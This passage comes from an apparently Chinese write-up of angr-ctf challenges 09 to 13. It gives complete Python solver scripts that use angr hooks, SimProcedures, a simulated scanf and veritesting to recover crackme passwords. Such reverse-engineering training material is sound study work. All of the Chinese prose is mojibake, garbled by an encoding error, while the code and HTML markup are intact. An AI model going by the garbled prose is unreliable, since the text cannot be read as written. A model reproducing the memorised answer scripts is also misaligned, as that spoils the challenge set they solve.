@proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># eax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x80493D3</span>) <span class="hljs-comment"># first insn after my_hook_func() returned</span><br><br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br>    check_state.add_constraints(check_state.regs.eax == <span class="hljs-number">1</span>) <span class="hljs-comment"># constraint for eval == 1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password0: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br>    <span class="hljs-comment"># now we need to calculate the password&#x27;s val after complex()</span><br>    simgr2 = proj.factory.simgr(check_state)<br>    simgr2.explore(find = <span class="hljs-number">0x8049428</span>) <span class="hljs-comment"># last insn before second scanf()</span><br><br>    check_state2 = simgr2.found[<span class="hljs-number">0</span>]<br>    password = check_state2.memory.load(password_addr, password_size)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password1: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state2.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/xHpXA6WNqwisaLT.png" alt="image.png"></p><blockquote><p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§æ›´åŠ ç®€æ´çš„å†™æ³•å°±æ˜¯ hook æ‰ <code>check_equals()</code> ä¹‹åç›´æ¥ä» <code>entry_state</code> å¼€å§‹ explore() åˆ°è¾“å‡º <code>&quot;Good Job.&quot;</code> ï¼Œä½†ç¬”è€…åœ¨åˆšå¼€å§‹å†™çš„æ—¶å€™æ˜¯æ²¡æƒ³åˆ°çš„â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    init_state = proj.factory.entry_state()<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># rax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure></blockquote><h2 id="10-angr-simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨">10_angr_simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ï¼Œè¿™ä¸€æ¬¡çš„ä¼ªä»£ç è¿˜æ˜¯ä¸€å¨å²æ‰€ä»¥ç›´æ¥çœ‹æ±‡ç¼–ï¼Œå¯ä»¥çœ‹åˆ°è™½ç„¶è¿˜æ˜¯æƒ¯ä¾‹çš„ <code>complex_function()</code> å¯¹è¾“å…¥è¿›è¡Œå¤„ç†åä½¿ç”¨ <code>check_equals()</code> è¿›è¡Œè·¯å¾„çˆ†ç‚¸çš„é€å­—ç¬¦æ¯”è¾ƒï¼Œä½†ä¸åŒçš„æ˜¯è¿™ä¸€æ¬¡å¤šäº†è®¸å¤šçš„ä¼ªè·¯å¾„ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/rj5ThAGsOeql9FP.png" alt="image.png"></p><p>è€Œæ¯ä¸ªä¼ªè·¯å¾„åé¢éƒ½å¯¹åº”ç€ä¸€ä¸ªè·¯å¾„çˆ†ç‚¸çš„ <code>check_equals()</code> ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/pLiH6FYE1DJfrc9.png" alt="image.png"></p><p>å¦‚æœæˆ‘ä»¬å¯¹äºæ¯ä¸ªä¼ªè·¯å¾„åè¾¹çš„åŸºæœ¬å—éƒ½æ‰‹åŠ¨è¿›è¡Œ hookï¼Œé‚£æœªå…ä¹Ÿè¿‡äºéº»çƒ¦ï¼Œå› æ­¤è¿™ä¸€æ¬¡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ angr ç›´æ¥é€šè¿‡å‡½æ•°ç¬¦å·æ¥ hook æ‰ <code>check_equals()</code> å‡½æ•°</p><h3 id="angr-SimProcedure-æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰">angr.SimProcedure - æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰</h3><p>åœ¨ angr ä¸­ <code>angr.SimProcedure</code> ç±»ç”¨æ¥è¡¨ç¤º<strong>åœ¨ä¸€ä¸ªçŠ¶æ€ä¸Šçš„ä¸€ä¸ªè¿è¡Œè¿‡ç¨‹</strong>â€”â€”å³å‡½æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ª SimPrecedure</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª <code>angr.SimProcedure</code> çš„ç±»å¹¶é‡å†™ <code>run()</code> æ–¹æ³•çš„æ–¹å¼æ¥è¡¨ç¤ºä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°ï¼Œå…¶ä¸­ <code>run()</code> æ–¹æ³•çš„å‚æ•°ä¸ºè¯¥å‡½æ•°æ‰€æ¥æ”¶çš„å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, arg1, arg2</span>):<br>        <span class="hljs-comment"># do something, this&#x27;s an example</span><br>        <span class="hljs-keyword">return</span> self.state.memory.load(arg1, arg2)<br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰å‡½æ•°è¿‡ç¨‹ä¸»è¦ç”¨äºå¯¹æ–‡ä»¶ä¸­çš„åŸæœ‰å‡½æ•°è¿›è¡Œæ›¿æ¢ï¼Œä¾‹å¦‚ angr ç¼ºçœä¼šç”¨å†…ç½®çš„ä¸€äº› SimProcedure æ¥æ›¿æ¢æ‰ä¸€äº›åº“å‡½æ•°<br>è‹¥æˆ‘ä»¬å·²ç»æœ‰è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>project.hook_symbol(symbol_str, sim_procedure_instance)</code> æ¥è‡ªåŠ¨ hook æ‰æ–‡ä»¶ä¸­æ‰€æœ‰çš„å¯¹åº”ç¬¦å·ï¼Œå…¶ä¸­ <code>run()</code> æ–¹æ³•çš„<strong>å‚æ•°ä¸ºè¢«æ›¿æ¢å‡½æ•°æ‰€æ¥æ”¶çš„å‚æ•°</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>class MyProcedure(angr.SimProcedure):<br>    def run(self, arg1, arg2):<br>        # do something, this&#x27;s an example<br>        return self.state.memory.load(arg1, arg2)<br><br>proj = angr.Project(&#x27;./test&#x27;)<br>proj.hook_symbol(&#x27;func_to_hook&#x27;, MyProcedure())<br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œåœ¨ SimProcedure çš„ <code>run()</code> è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›æœ‰ç”¨çš„æˆå‘˜å‡½æ•°ï¼š</p><ul><li><code>ret(expr)</code>: å‡½æ•°è¿”å›</li><li><code>jump(addr)</code>: è·³è½¬åˆ°æŒ‡å®šåœ°å€</li><li><code>exit(code)</code>: ç»ˆæ­¢ç¨‹åº</li><li><code>call(addr, args, continue_at)</code>: è°ƒç”¨æ–‡ä»¶ä¸­çš„å‡½æ•°</li><li><code>inline_call(procedure, *args)</code>: å†…è”åœ°è°ƒç”¨å¦ä¸€ä¸ª SimProcedure</li></ul><h3 id="FINAL-EXPLOIT-7">FINAL EXPLOIT</h3><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å°†è¯¥ç¬¦å·ç›´æ¥æ›¿æ¢æˆæˆ‘ä»¬çš„è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°å³å¯ï¼Œå› æ­¤æœ€ç»ˆçš„å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br>import sys<br><br>class MyRelacementHookProcedure(angr.SimProcedure):<br>    def run(self, buffer_addr, buffer_len):<br>        buffer = self.state.memory.load(buffer_addr, buffer_len)<br>        compared_str = b&#x27;XFQUUEQFKBECVEJF&#x27;<br>        return claripy.If(buffer == compared_str, claripy.BVV(1, 32), claripy.BVV(0, 32))<br><br>def find_path(state):<br>    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def avoid_path(state):<br>    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())<br><br>def solver():<br>    bin_path = &#x27;./10_angr_simprocedures&#x27;<br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    # hook the check_equals()<br>    proj.hook_symbol(&#x27;check_equals_XFQUUEQFKBECVEJF&#x27;, MyRelacementHookProcedure())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        print(solution_state.posix.dumps(sys.stdin.fileno()))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/1GntXiVluADdbRs.png" alt="image.png"></p><h2 id="11-angr-sim-scanfï¼šæ¨¡æ‹Ÿ-scanf">11_angr_sim_scanfï¼šæ¨¡æ‹Ÿ scanf</h2><p>æƒ¯ä¾‹æ‹–è¿› IDAï¼Œæç¤º graph is too big</p><p><img src="https://s2.loli.net/2022/11/03/epOU2j6iDcyZutL.png" alt="image.png"></p><p>çœ‹ä¸€ä¸‹åæ±‡ç¼–ï¼Œå¯ä»¥å‘ç°è¿™ä¸€æ¬¡æ˜¯åœ¨ <code>scanf()</code> å‰é¢æœ‰å¾ˆå¤šä¼ªåˆ†æ”¯ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/LP97x2dUXNjTsKz.png" alt="image.png"></p><p>è¿™äº›ä¼ªåˆ†æ”¯çš„å¯¼å‘éƒ½æ˜¯ä»¥ <code>scanf()</code> å¼€å¤´çš„åŸºæœ¬å—ï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶éƒ½ä½¿ç”¨ <code>%u %u</code> æ¥è¯»å…¥ä¸¤ä¸ªå››å­—èŠ‚æ— ç¬¦å·æ•°åä½¿ç”¨ <code>strncmp()</code> ä¸ 8 å­—èŠ‚çš„å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”</p><p><img src="https://s2.loli.net/2022/11/03/d4GlDOc7TANCZMS.png" alt="image.png"></p><p>åœ¨æœ€å¼€å§‹è¿˜æœ‰ <code>complex_function()</code> å¤„ç†å¾…æ¯”è¾ƒçš„æºå­—ç¬¦ä¸²ï¼Œè¿˜æ˜¯è€æ ·å­å°±ä¸è¿›å»çœ‹äº†ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/v8bZzJgAPOpG7K4.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™é¢˜çš„ç»“æ„å’Œ 02 å…¶å®æ˜¯åŸºæœ¬ä¸Šä¸€æ ·çš„ï¼Œåªä¸è¿‡ <code>scanf()</code> è¢«ç§»åˆ°äº†ä¼ªåˆ†æ”¯åŸºæœ¬å—ä¸­ï¼Œå› æ­¤ç”¨ 02 çš„è§£é¢˜è„šæœ¬ä¾ç„¶å¯ä»¥ç§’è§£ï¼Œä½†è¿™æ ·å°±ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„äº†ï¼šï¼‰</p><p>æœ¬é¢˜å®é™…ä¸Šç®—æ˜¯å¯¹ä¸Šä¸€é¢˜çš„æ‰©å±•ï¼Œç”±äºæˆ‘ä»¬å·²çŸ¥å¯¹ <code>scanf()</code> çš„è°ƒç”¨ä¼šè¯»å…¥ä¸¤ä¸ªæ•°å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å®ç°ä¸€ä¸ª SimProcedure æ¥æ¨¡æ‹Ÿè¯¥è¿‡ç¨‹ï¼Œè€Œä¸éœ€è¦å†èµ° <code>scanf()</code> å†…éƒ¨çš„å¤æ‚è·¯å¾„</p><p>è¿™é‡Œæˆ‘ä»¬è‹¥æ˜¯åœ¨ <code>run()</code> æ–¹æ³•å†…åˆ›å»º BVS ï¼Œåˆ™å¯ä»¥é€šè¿‡å°†å…¶å‚¨å­˜åˆ° <code>state.globals</code> åˆ—è¡¨çš„æ–¹å¼ä»¥ä¾¿åç»­å–ç”¨</p><p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmt_str, buffer0_addr, buffer1_addr</span>):<br>        buffer0 = claripy.BVS(<span class="hljs-string">&#x27;buffer0&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        buffer1 = claripy.BVS(<span class="hljs-string">&#x27;buffer1&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 4 bytes</span><br>        self.state.memory.store(buffer0_addr, buffer0)<br>        self.state.memory.store(buffer1_addr, buffer1)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>] = buffer0<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>] = buffer1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./11_angr_sim_scanf&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MyScanfProcedure())<br>    <br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        buffer0 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer0&#x27;</span>]<br>        buffer1 = solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;buffer1&#x27;</span>]<br>        password0 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        password1 = solution_state.solver.<span class="hljs-built_in">eval</span>(buffer1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password0, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>.from_bytes(password1, <span class="hljs-string">&#x27;little&#x27;</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/03/pCsdR9Gckawg2Zm.png" alt="image.png"></p><h1>0x05. angr-ctfï¼šè·¯å¾„åˆå¹¶</h1><h2 id="12-angr-veritestingï¼šè·¯å¾„åˆå¹¶">12_angr_veritestingï¼šè·¯å¾„åˆå¹¶</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œä¸çŸ¥é“ä¸ºå•¥ IDA åç¼–è¯‘å‡ºæ¥ä¸€å¨å²æ‰€ä»¥ç›´æ¥çœ‹æ±‡ç¼–ï¼Œåœ¨è¯»å…¥è¾“å…¥åæ¥åˆ°çš„çº¢æ¡†é‡Œæ˜¯ä¸€ä¸ªå¾ªç¯  <code>for (int i = 0; i &lt;= 0x1F; i++)</code> ï¼Œæ¯è½®å¾ªç¯éƒ½ä¼šè®¡ç®— <code>complex_function('X', i + 'V')</code> å¹¶å°†ç»“æœä¸ <code>input[i]</code> å¯¹æ¯”ï¼Œå…¨éƒ¨ç›¸ç­‰æ‰èƒ½é€šè¿‡</p><p><img src="https://s2.loli.net/2022/11/04/WaUX8uEwyiMeJFs.png" alt="image.png"></p><p>å½“ç„¶å¦‚æœå½“ä½œå¸¸è§„çš„é€†å‘é¢˜æ¥åšçš„è¯è§£é¢˜è„šæœ¬å¾ˆå¿«å°±èƒ½å†™å¥½äº†ï¼Œä½†è¿™ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„ï¼šï¼‰</p><p>è¿™é¢˜çœ‹èµ·æ¥å’Œç¬¬ä¸€é¢˜å·®ä¸å¤šï¼Œç”±ä½†å…¶é€å­—ç¬¦æ¯”è¾ƒå¢åŠ è®¡æ•°çš„å†™æ³•ä¼šå¯¼è‡´è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¿›è¡Œ <strong>è·¯å¾„åˆå¹¶</strong> ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨åˆ›å»º simgr æ—¶æŒ‡å®šå‚æ•° <code>veritesting=True</code>ï¼Œè¿™æ · angr ä¾¿ä¼šåœ¨è¿è¡Œè¿‡ç¨‹ä¸­è‡ªåŠ¨è¿›è¡Œè·¯å¾„åˆå¹¶ï¼Œä»è€Œç¼“è§£è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜</p><blockquote><p>å…·ä½“åŸç†å¯ä»¥å‚è€ƒ <a href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos%20et%20al._2014_Enhancing%20Symbolic%20Execution%20with%20Veritesting.pdf">è¿™ç¯‡è®ºæ–‡</a></p></blockquote><p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;12_angr_veritesting&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, veritesting = <span class="hljs-literal">True</span>)<br>    simgr.explore(find = <span class="hljs-number">0x8049371</span>, avoid = <span class="hljs-number">0x8049393</span>)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯å‡ ç§’é’Ÿå°±è§£å‡ºæ¥äº†ï¼š</p><p><img src="https://s2.loli.net/2022/11/04/FvgfaL9sIjND3bh.png" alt="image.png"></p><h1>0x06. angr-ctfï¼šåº“æ“ä½œ</h1><h2 id="13-angr-static-binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢">13_angr_static_binaryï¼šé™æ€ç¼–è¯‘å‡½æ•°æ›¿æ¢</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿™æ¬¡è¿˜æ˜¯æƒ¯ä¾‹çš„è¯»å…¥è¾“å…¥åä½¿ç”¨ complex å‡½æ•°å¤„ç†åä¸å¾…å¯¹æ¯”å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”çš„æ¨¡å¼ï¼Œå’Œç¬¬ä¸€é¢˜åŸºæœ¬ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯è¿™ä¸€æ¬¡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘çš„</p><p><img src="https://s2.loli.net/2022/11/04/4IDZJ85bN2oV6BU.png" alt="image.png"></p><p>ç¬”è€…ä¸€å¼€å§‹ä¹Ÿæ²¡çœ‹æ˜ç™½è¦å¹²å•¥ï¼Œåé¢æ‹‰ç¬¬ä¸€é¢˜çš„è„šæœ¬è¿‡æ¥ç®€å•è·‘äº†ä¸€ä¸‹å‘ç°åŠå¤©æ²¡å‡ºç»“æœï¼Œçœ‹äº†çœ‹å‡ºé¢˜äººç•™ä¸‹çš„ <code>scaffold13.py</code> ä¸­æœ‰è¿™æ ·çš„è¯ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># This challenge is the exact same as the first challenge, except that it was</span><br><span class="hljs-comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span><br><span class="hljs-comment"># library functions with SimProcedures that work much more quickly.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To solve the challenge, manually hook any standard library c functions that</span><br><span class="hljs-comment"># are used. Then, ensure that you begin the execution at the beginning of the</span><br><span class="hljs-comment"># main function. Do not use entry_state.</span><br></code></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯è¯´é€šå¸¸ angr ä¼šè‡ªåŠ¨å°†æ ‡å‡†åº“å½“ä¸­çš„å‡½æ•°æ›¿æ¢æˆ angr å†…å»ºçš„ SimProcedures 